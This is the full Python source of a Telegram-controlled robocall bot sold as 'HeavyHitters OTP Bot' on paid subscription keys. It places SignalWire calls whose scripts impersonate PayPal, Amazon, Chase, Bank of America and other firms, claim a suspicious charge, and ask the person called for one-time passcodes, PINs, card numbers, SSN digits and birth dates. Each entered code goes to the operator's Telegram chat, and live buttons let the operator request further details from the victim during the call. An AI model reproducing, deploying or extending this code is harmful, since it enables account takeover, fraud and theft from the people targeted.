import os
import logging
import threading
import requests as req
import sqlite3
import secrets
import string
from datetime import datetime, timedelta
from flask import Flask, request, Response
from signalwire.rest import Client as SignalWireClient
from signalwire.voice_response import VoiceResponse, Gather
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

TELEGRAM_TOKEN   = os.environ["TELEGRAM_TOKEN"]
SW_PROJECT_ID    = os.environ["SW_PROJECT_ID"]
SW_AUTH_TOKEN    = os.environ["SW_AUTH_TOKEN"]
SW_SPACE_URL     = os.environ["SW_SPACE_URL"]
SW_NUMBER        = os.environ["SW_NUMBER"]
WEBHOOK_BASE_URL = os.environ["WEBHOOK_BASE_URL"]
ADMIN_CHAT_ID    = int(os.environ.get("ADMIN_CHAT_ID", "0"))

sw_client = SignalWireClient(SW_PROJECT_ID, SW_AUTH_TOKEN, signalwire_space_url=SW_SPACE_URL)
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)
call_sessions = {}

# ─── BASE DE DATOS ─────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect("/app/bot.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY, plan TEXT, days INTEGER, created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL, expires_at TEXT DEFAULT NULL)""")
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY, plan TEXT, expires_at TEXT)""")
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect("/app/bot.db")
    conn.row_factory = sqlite3.Row
    return conn

def is_active(chat_id: int) -> bool:
    if chat_id == ADMIN_CHAT_ID:
        return True
    conn = get_db()
    row = conn.cursor().execute("SELECT expires_at FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    conn.close()
    if not row:
        return False
    return datetime.now() < datetime.fromisoformat(row["expires_at"])

def generate_key(plan: str, days: int) -> str:
    chars = string.ascii_uppercase + string.digits
    r = ''.join(secrets.choice(chars) for _ in range(12))
    key = f"HVY-{r[:4]}-{r[4:8]}-{r[8:12]}"
    conn = get_db()
    conn.cursor().execute("INSERT INTO keys (key, plan, days, created_at) VALUES (?, ?, ?, ?)",
        (key, plan, days, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return key

def redeem_key(key: str, chat_id: int):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM keys WHERE key = ?", (key,))
    row = c.fetchone()
    if not row:
        conn.close()
        return None, "❌ Key inválida."
    if row["redeemed_by"]:
        conn.close()
        return None, "❌ Esta key ya fue usada."
    expires_at = (datetime.now() + timedelta(days=row["days"])).isoformat()
    c.execute("UPDATE keys SET redeemed_by=?, expires_at=? WHERE key=?", (chat_id, expires_at, key))
    c.execute("INSERT INTO users (chat_id, plan, expires_at) VALUES (?, ?, ?) ON CONFLICT(chat_id) DO UPDATE SET plan=?, expires_at=?",
        (chat_id, row["plan"], expires_at, row["plan"], expires_at))
    conn.commit()
    conn.close()
    return {"plan": row["plan"], "days": row["days"], "expires_at": expires_at}, None

IVR_MENSAJES = {
    "cobrar": "Hola, le llamamos de parte de nuestra empresa. Usted tiene una factura pendiente. Si desea pagar ahora marque 1. Para hablar con un agente marque 2. Para escuchar el monto marque 3.",
    "confirmar": "Hola, le llamamos para confirmar su cita. Si confirma marque 1. Para cancelar marque 2. Para reprogramar marque 3.",
    "recordatorio": "Hola, tiene un pago proximo a vencer. Si ya pago marque 1. Si necesita mas tiempo marque 2. Para hablar con un agente marque 3.",
    "encuesta": "Hola, le llamamos para una encuesta. Si desea participar marque 1. Si no desea participar marque 2.",
}

# ─── EMPRESAS ─────────────────────────────────────────────────────────────────
EMPRESAS = {
    "paypal":    {"nombre": "PayPal",          "emoji": "💰", "mensaje": "Hello, this is PayPal. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "amazon":    {"nombre": "Amazon",          "emoji": "🛍️", "mensaje": "Hello, this is Amazon. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "chase":     {"nombre": "Chase Bank",      "emoji": "🏦", "mensaje": "Hello, this is Chase Bank. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "affirm":    {"nombre": "Affirm",          "emoji": "🟦", "mensaje": "Hello, this is Affirm. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "ebay":      {"nombre": "eBay",            "emoji": "🛒", "mensaje": "Hello, this is eBay. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "google":    {"nombre": "Google",          "emoji": "🔵", "mensaje": "Hello, this is Google. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "wellsfargo":{"nombre": "Wells Fargo",     "emoji": "🏦", "mensaje": "Hello, this is Wells Fargo. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
    "bofa":      {"nombre": "Bank of America", "emoji": "🏦", "mensaje": "Hello, this is Bank of America. We have detected a suspicious transaction of 1,274 dollars on your account. To deny this transaction press 1. To approve or cancel press 2."},
}

IVR_OPCIONES = {
    "cobrar":      {"1": "💳 Quiere PAGAR", "2": "👤 Quiere agente", "3": "🔊 Escuchar monto"},
    "confirmar":   {"1": "✅ CONFIRMÓ cita", "2": "❌ CANCELÓ cita", "3": "🔄 Reprogramar"},
    "recordatorio":{"1": "✅ Ya pagó", "2": "⏳ Más tiempo", "3": "👤 Quiere agente"},
    "encuesta":    {"1": "✅ Acepta", "2": "❌ Rechaza"},
}
# Opciones para empresas
for emp in EMPRESAS:
    IVR_OPCIONES[emp] = {"1": "🚫 Denegó la transacción", "2": "✅ Quiere aprobar/cancelar"}

IVR_RESPUESTA = {
    "cobrar":      {"1": "Recibira un enlace de pago pronto.", "2": "Le comunicamos con un agente.", "3": "Su saldo esta en linea."},
    "confirmar":   {"1": "Cita confirmada.", "2": "Cita cancelada.", "3": "Le contactaremos pronto."},
    "recordatorio":{"1": "Pago registrado, gracias.", "2": "Un agente le contactara.", "3": "Le transferimos."},
    "encuesta":    {"1": "Gracias por participar.", "2": "Que tenga buen dia."},
}

flask_app = Flask(__name__)

def notify_telegram(chat_id, texto):
    try:
        req.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}, timeout=10)
    except Exception as e:
        log.error(e)

@flask_app.route("/voice/<action>", methods=["POST"])
def voice_webhook(action):
    call_sid    = request.form.get("CallSid", "")
    to_number   = request.form.get("To", "")
    answered_by = request.form.get("AnsweredBy", "")
    session     = call_sessions.get(call_sid, {})
    chat_id     = session.get("chat_id", ADMIN_CHAT_ID)

    response = VoiceResponse()

    # Buzón de voz — colgar
    if answered_by in ["machine_start", "machine_end_beep", "machine_end_silence", "machine_end_other", "fax"]:
        notify_telegram(chat_id, f"🤖 *Buzón de voz detectado*\n📱 `{to_number}`\n📴 Colgando...")
        response.hangup()
        return Response(str(response), mimetype="text/xml")

    # Humano — reproducir mensaje
    if answered_by == "human":
        notify_telegram(chat_id, f"👤 *Humano detectado*\n📱 `{to_number}`\n🔊 Reproduciendo mensaje...")
    else:
        notify_telegram(chat_id, f"✅ *Llamada contestada*\n📱 `{to_number}`\n🔊 Reproduciendo mensaje...")

    response.pause(length=1)
    gather = Gather(num_digits=1, action=f"{WEBHOOK_BASE_URL}/gather/{action}", method="POST", timeout=15)

    # Usar mensaje de empresa si aplica
    if action in EMPRESAS:
        gather.say(EMPRESAS[action]["mensaje"], language="en-US", voice="Polly.Joanna", rate="85%")
    else:
        gather.say(IVR_MENSAJES.get(action, "Press 1 or 2."), language="es-MX", rate="85%")

    response.append(gather)
    response.say("We did not receive your response. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
    response.hangup()
    return Response(str(response), mimetype="text/xml")

@flask_app.route("/gather/<action>", methods=["POST"])
def gather_webhook(action):
    digit    = request.form.get("Digits", "?")
    call_sid = request.form.get("CallSid", "")
    to_number = request.form.get("To", "")
    session  = call_sessions.get(call_sid, {})
    chat_id  = session.get("chat_id", ADMIN_CHAT_ID)
    opcion   = IVR_OPCIONES.get(action, {}).get(digit, f"Marcó: {digit}")

    notify_telegram(chat_id, f"📞 *Respuesta*\n📱 `{to_number}`\n🎯 `{action.upper()}`\n🔢 *{digit}*\n📋 {opcion}")

    response = VoiceResponse()

    # Si es empresa y marcó 1 o 2 → pedir código OTP de 6 dígitos
    if action in EMPRESAS and digit in ["1", "2"]:
        gather = Gather(
            num_digits=6,
            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
            method="POST",
            timeout=20,
            finish_on_key=""
        )
        gather.say("We have sent a 6 digit verification code to your phone number. Please enter it now.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.append(gather)
        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
    # Si es cobrar y marcó 1 → pedir código de cuenta
    elif action == "cobrar" and digit == "1":
        gather = Gather(
            num_digits=6,
            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
            method="POST",
            timeout=15,
            finish_on_key=""
        )
        gather.say("Por favor ingrese los 6 digitos de su numero de cuenta.", language="es-MX", rate="85%")
        response.append(gather)
        response.say("No recibimos su codigo. Hasta luego.", language="es-MX", rate="85%")
    else:
        texto_cliente = IVR_RESPUESTA.get(action, {}).get(digit, "Gracias. Que tenga un buen dia.")
        response.say(texto_cliente, language="es-MX", rate="85%")

    response.hangup()
    return Response(str(response), mimetype="text/xml")

@flask_app.route("/codigo/<call_sid>/<chat_id>", methods=["POST"])
def codigo_webhook(call_sid, chat_id):
    codigo    = request.form.get("Digits", "")
    to_number = request.form.get("To", "")

    # Guardar info de la llamada activa
    call_sessions[call_sid]["codigo"] = codigo
    call_sessions[call_sid]["to_number"] = to_number

    # Enviar botones inline a Telegram
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Válido", "callback_data": f"accion|valido|{call_sid}"},
                {"text": "❌ Inválido", "callback_data": f"accion|invalido|{call_sid}"}
            ],
            [
                {"text": "🔢 Pedir SSN", "callback_data": f"accion|ssn|{call_sid}"},
                {"text": "🎂 Pedir DOB", "callback_data": f"accion|dob|{call_sid}"}
            ],
            [
                {"text": "🔑 Pedir PIN", "callback_data": f"accion|pin|{call_sid}"},
                {"text": "💳 Pedir Card #", "callback_data": f"accion|card|{call_sid}"}
            ],
            [
                {"text": "📧 Mail OTP", "callback_data": f"accion|mailotp|{call_sid}"},
                {"text": "🚫 Colgar", "callback_data": f"accion|colgar|{call_sid}"}
            ]
        ]
    }
    try:
        req.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={
                "chat_id": int(chat_id),
                "text": f"🔢 *Código de cuenta recibido*\n━━━━━━━━━━━━━━━\n📱 `{to_number}`\n🔑 Código: *{codigo}*\n\n¿Qué deseas hacer?",
                "parse_mode": "Markdown",
                "reply_markup": keyboard
            },
            timeout=10
        )
    except Exception as e:
        log.error(e)

    # Mantener cliente en espera
    response = VoiceResponse()
    response.say("Thank you. We have received your code. Please hold while we verify your information.", language="en-US", voice="Polly.Joanna", rate="85%")
    response.pause(length=30)
    response.say("Thank you for your patience. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
    response.hangup()
    return Response(str(response), mimetype="text/xml")

@flask_app.route("/accion_llamada/<call_sid>/<accion>", methods=["GET"])
def accion_llamada(call_sid, accion):
    """SignalWire llama aquí para obtener las instrucciones siguientes"""
    session = call_sessions.get(call_sid, {})
    chat_id = session.get("chat_id", ADMIN_CHAT_ID)
    response = VoiceResponse()

    if accion == "valido":
        response.say("Your code has been successfully validated. Thank you for verifying. Have a great day.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.hangup()

    elif accion == "invalido":
        # Pedir el código de nuevo
        gather = Gather(
            num_digits=6,
            action=f"{WEBHOOK_BASE_URL}/codigo/{call_sid}/{chat_id}",
            method="POST",
            timeout=20,
            finish_on_key=""
        )
        gather.say("We're sorry, the code you entered is incorrect. Please enter your 6 digit verification code again.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.append(gather)
        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.hangup()

    elif accion == "colgar":
        response.say("Thank you for calling. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.hangup()

    elif accion in ["ssn", "dob", "pin", "card", "mailotp"]:
        digitos  = {"ssn": 3, "dob": 8, "pin": 4, "card": 16, "mailotp": 6}
        mensajes = {
            "ssn":     "Please enter the last 3 digits of your Social Security Number.",
            "dob":     "Please enter your date of birth in the format month, day, year.",
            "pin":     "Please enter your account PIN.",
            "card":    "Please enter your card number.",
            "mailotp": "We have sent a verification code to your email address. Please enter it now.",
        }
        num_dig = digitos.get(accion, 6)
        gather = Gather(
            num_digits=num_dig,
            action=f"{WEBHOOK_BASE_URL}/codigo2/{call_sid}/{chat_id}/{accion}",
            method="POST",
            timeout=20,
            finish_on_key=""
        )
        gather.say(mensajes[accion], language="en-US", voice="Polly.Joanna", rate="85%")
        response.append(gather)
        response.say("We did not receive your response. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.hangup()

    else:
        response.say("Thank you. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
        response.hangup()

    return Response(str(response), mimetype="text/xml")

@flask_app.route("/codigo2/<call_sid>/<chat_id>/<tipo>", methods=["POST"])
def codigo2_webhook(call_sid, chat_id, tipo):
    """Recibe el segundo código del cliente"""
    codigo    = request.form.get("Digits", "")
    to_number = request.form.get("To", "")

    nombres = {"ssn": "SSN (últimos 3)", "dob": "Fecha de nacimiento", "pin": "PIN", "card": "Card #", "mailotp": "Mail OTP"}

    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Válido", "callback_data": f"accion|valido|{call_sid}"},
                {"text": "❌ Inválido", "callback_data": f"accion|invalido|{call_sid}"}
            ],
            [
                {"text": "🚫 Colgar", "callback_data": f"accion|colgar|{call_sid}"}
            ]
        ]
    }
    try:
        req.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={
                "chat_id": int(chat_id),
                "text": f"🔢 *{nombres.get(tipo, tipo)}*\n━━━━━━━━━━━━━━━\n📱 `{to_number}`\n🔑 Código: *{codigo}*\n\n¿Válido o inválido?",
                "parse_mode": "Markdown",
                "reply_markup": keyboard
            },
            timeout=10
        )
    except Exception as e:
        log.error(e)

    response = VoiceResponse()
    response.say("Thank you. We have received your information. Please hold while we verify.", language="en-US", voice="Polly.Joanna", rate="85%")
    response.pause(length=30)
    response.say("Thank you for your patience. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
    response.hangup()
    return Response(str(response), mimetype="text/xml")

@flask_app.route("/status", methods=["POST"])
def call_status():
    status      = request.form.get("CallStatus", "")
    to_number   = request.form.get("To", "")
    call_sid    = request.form.get("CallSid", "")
    answered_by = request.form.get("AnsweredBy", "")
    session     = call_sessions.get(call_sid, {})
    chat_id     = session.get("chat_id", ADMIN_CHAT_ID)

    log.info(f"Status: {status} | AnsweredBy: {answered_by} | To: {to_number}")

    if status == "initiated":
        notify_telegram(chat_id, f"📞 *Llamada en progreso...*\n📱 `{to_number}`")
    elif status == "ringing":
        notify_telegram(chat_id, f"🔔 *Timbrando...*\n📱 `{to_number}`")
    elif status == "in-progress":
        if answered_by == "human":
            notify_telegram(chat_id, f"👤 *Humano detectado*\n📱 `{to_number}`")
        elif "machine" in answered_by:
            notify_telegram(chat_id, f"🤖 *Buzón de voz detectado*\n📱 `{to_number}`")
        else:
            notify_telegram(chat_id, f"✅ *Llamada contestada*\n📱 `{to_number}`")
    elif status == "no-answer":
        notify_telegram(chat_id, f"📵 *No contestó*\n📱 `{to_number}`")
    elif status == "busy":
        notify_telegram(chat_id, f"📶 *Línea ocupada*\n📱 `{to_number}`")
    elif status == "failed":
        notify_telegram(chat_id, f"❌ *Llamada fallida*\n📱 `{to_number}`")
    elif status == "canceled":
        notify_telegram(chat_id, f"🚫 *Llamada cancelada*\n📱 `{to_number}`")
    elif status == "completed":
        notify_telegram(chat_id, f"📴 *Llamada finalizada*\n📱 `{to_number}`")
    return "", 204

def menu_sin_key():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔑 Redeem Key")],
        [KeyboardButton("💼 Ver Planes")],
        [KeyboardButton("📞 Soporte")],
    ], resize_keyboard=True)

def menu_con_key():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🔐 Obtener OTP")],
        [KeyboardButton("🛒 Comprar Plan"), KeyboardButton("📞 Soporte")],
    ], resize_keyboard=True)

def is_active(chat_id: int) -> bool:
    if chat_id == ADMIN_CHAT_ID:
        return True
    conn = get_db()
    row = conn.cursor().execute("SELECT expires_at FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    conn.close()
    if not row:
        return False
    return datetime.now() < datetime.fromisoformat(row["expires_at"])

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    imagen  = "https://i.ibb.co/Fbm7Br8N/image-9.jpg"

    if is_active(chat_id):
        await update.message.reply_photo(
            photo=imagen,
            caption=(
                "🔐 *HeavyHitters OTP Bot*\n\n"
                "Bienvenido de vuelta. Selecciona una opción del menú."
            ),
            parse_mode="Markdown"
        )
        await update.message.reply_text("Selecciona una acción:", reply_markup=menu_con_key())
    else:
        await update.message.reply_photo(
            photo=imagen,
            caption=(
                "🔐 *HeavyHitters OTP Bot*\n\n"
                "Bienvenido al sistema de llamadas automatizadas más poderoso del mercado.\n\n"
                "✅ Llama a tus clientes automáticamente\n"
                "✅ Obtén códigos OTP en tiempo real\n"
                "✅ Control total desde Telegram\n"
                "✅ Activación inmediata con key\n\n"
                "💼 *Planes disponibles:*\n"
                "🥉 1 Día — $35\n"
                "🥈 3 Días — $79\n"
                "🥇 1 Semana — $129\n"
                "👑 1 Mes — $299\n\n"
                "📩 Para adquirir tu plan contacta:\n"
                "@heavyhittersrd"
            ),
            parse_mode="Markdown"
        )
        await update.message.reply_text("Activa tu plan para comenzar:", reply_markup=menu_sin_key())

async def cmd_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ Sin permiso.")
        return
    planes = {"1dia": (1, "1 Día", "$30"), "3dias": (3, "3 Días", "$70"), "semana": (7, "1 Semana", "$100"), "mes": (30, "1 Mes", "$300")}
    if not context.args or context.args[0].lower() not in planes:
        await update.message.reply_text("⚠️ Uso:\n`/genkey 1dia`\n`/genkey 3dias`\n`/genkey semana`\n`/genkey mes`", parse_mode="Markdown")
        return
    days, plan_name, precio = planes[context.args[0].lower()]
    key = generate_key(plan_name, days)
    await update.message.reply_text(
        f"✅ *Key Generada*\n━━━━━━━━━━━━━\n🔑 `{key}`\n📋 Plan: *{plan_name}*\n💰 Precio: *{precio}*\n\nEnvíale esta key al cliente.",
        parse_mode="Markdown")

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if not context.args:
        await update.message.reply_text("⚠️ Uso: `/redeem HVY-XXXX-XXXX-XXXX`", parse_mode="Markdown")
        return
    key = context.args[0].upper().strip()
    result, error = redeem_key(key, chat_id)
    if error:
        await update.message.reply_text(error)
        return
    expires = datetime.fromisoformat(result["expires_at"])
    await update.message.reply_text(
        f"🎉 *¡Key activada!*\n📋 Plan: *{result['plan']}*\n📅 Expira: *{expires.strftime('%d/%m/%Y')}*\n\nYa puedes usar el bot.",
        parse_mode="Markdown", reply_markup=menu_con_key())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = update.message.text.strip()
    chat_id = update.effective_chat.id

    if texto == "🔑 Redeem Key":
        context.user_data["esperando_key"] = True
        await update.message.reply_text("🔑 Escribe tu key:\n`HVY-XXXX-XXXX-XXXX`", parse_mode="Markdown")
        return

    if context.user_data.get("esperando_key"):
        context.user_data.pop("esperando_key")
        key = texto.upper().strip()
        result, error = redeem_key(key, chat_id)
        if error:
            await update.message.reply_text(error)
        else:
            expires = datetime.fromisoformat(result["expires_at"])
            await update.message.reply_text(
                f"🎉 *¡Key activada!*\n📋 {result['plan']}\n📅 Expira: {expires.strftime('%d/%m/%Y')}",
                parse_mode="Markdown", reply_markup=menu_con_key())
        return

    if texto == "💼 Ver Planes":
        await update.message.reply_text(
            "💼 *Planes HeavyHitters OTP*\n"
            "━━━━━━━━━━━━━━━━━\n\n"
            "🥉 *1 Día* — $35\n"
            "🥈 *3 Días* — $79\n"
            "🥇 *1 Semana* — $129\n"
            "👑 *1 Mes* — $299\n\n"
            "✅ Llamadas ilimitadas incluidas\n"
            "✅ Cobros, confirmaciones, recordatorios y más\n"
            "✅ Activación inmediata con key\n\n"
            "📩 Para comprar contacta: @heavyhittersrd",
            parse_mode="Markdown")
        return

    if texto == "📞 Soporte":
        await update.message.reply_text("📞 Contacta: @heavyhittersrd")
        return

    if not is_active(chat_id):
        await update.message.reply_text("❌ Necesitas activar una key primero.", reply_markup=menu_sin_key())
        return

    if texto == "🔐 Obtener OTP":
        keyboard = [
            [InlineKeyboardButton("💰 PayPal", callback_data="empresa|paypal"),
             InlineKeyboardButton("🛍️ Amazon", callback_data="empresa|amazon")],
            [InlineKeyboardButton("🏦 Chase", callback_data="empresa|chase"),
             InlineKeyboardButton("🟦 Affirm", callback_data="empresa|affirm")],
            [InlineKeyboardButton("🛒 eBay", callback_data="empresa|ebay"),
             InlineKeyboardButton("🔵 Google", callback_data="empresa|google")],
            [InlineKeyboardButton("🏦 Wells Fargo", callback_data="empresa|wellsfargo"),
             InlineKeyboardButton("🏦 Bank of America", callback_data="empresa|bofa")],
        ]
        await update.message.reply_text(
            "🏢 *¿Qué empresa representas?*",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    if texto == "🛒 Comprar Plan":
        await update.message.reply_text(
            "💼 *Planes*\n🥉 1 Día — $30\n🥈 3 Días — $70\n🥇 1 Semana — $100\n👑 1 Mes — $300\n\nContacta: @heavyhittersrd",
            parse_mode="Markdown")
        return

    if "accion" in context.user_data:
        accion = context.user_data.pop("accion")
        numero = texto if texto.startswith("+") else "+" + texto
        try:
            await update.message.reply_text(f"📞 Llamando a `{numero}`...", parse_mode="Markdown")
            call = sw_client.calls.create(
                to=numero, from_=SW_NUMBER,
                url=f"{WEBHOOK_BASE_URL}/voice/{accion}",
                status_callback=f"{WEBHOOK_BASE_URL}/status",
                status_callback_method="POST",
                machine_detection="Enable",
                machine_detection_timeout=5)
            call_sessions[call.sid] = {"chat_id": chat_id}
            await update.message.reply_text("✅ Llamada iniciada")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")
        return

    partes = texto.upper().split()
    if len(partes) == 2 and partes[0] in {"COBRAR", "CONFIRMAR", "RECORDATORIO", "ENCUESTA"}:
        accion = partes[0].lower()
        numero = partes[1] if partes[1].startswith("+") else "+" + partes[1]
        try:
            await update.message.reply_text(f"📞 Llamando a `{numero}`...", parse_mode="Markdown")
            call = sw_client.calls.create(
                to=numero, from_=SW_NUMBER,
                url=f"{WEBHOOK_BASE_URL}/voice/{accion}",
                status_callback=f"{WEBHOOK_BASE_URL}/status",
                status_callback_method="POST",
                machine_detection="Enable",
                machine_detection_timeout=5)
            call_sessions[call.sid] = {"chat_id": chat_id}
            await update.message.reply_text("✅ Llamada iniciada")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")
        return

    await update.message.reply_text("Usa el menú.", reply_markup=menu_con_key() if is_active(chat_id) else menu_sin_key())

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    # Selección de empresa
    if data.startswith("empresa|"):
        _, empresa_key = data.split("|")
        empresa = EMPRESAS.get(empresa_key, {})
        context.user_data["accion"] = empresa_key
        await query.edit_message_text(
            f"{empresa.get('emoji')} *{empresa.get('nombre')}* seleccionada\n\n📱 Escribe el número a llamar:\n`+13023451233`",
            parse_mode="Markdown"
        )
        return

    # Acciones de llamada en tiempo real
    if data.startswith("accion|"):
        _, accion, call_sid = data.split("|")
        try:
            sw_client.calls(call_sid).update(
                url=f"{WEBHOOK_BASE_URL}/accion_llamada/{call_sid}/{accion}",
                method="GET"
            )
            nombres = {
                "valido": "✅ Código validado",
                "invalido": "❌ Código inválido",
                "ssn": "🔢 Pidiendo SSN",
                "dob": "🎂 Pidiendo DOB",
                "pin": "🔑 Pidiendo PIN",
                "card": "💳 Pidiendo Card #",
                "mailotp": "📧 Enviando Mail OTP",
                "colgar": "🚫 Colgando"
            }
            await query.edit_message_reply_markup(reply_markup=None)
            await query.message.reply_text(f"▶️ {nombres.get(accion, accion)}")
        except Exception as e:
            await query.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")

def run_flask():
    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), use_reloader=False)

def main():
    init_db()
    threading.Thread(target=run_flask, daemon=True).start()
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    log.info("✅ Bot activo")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
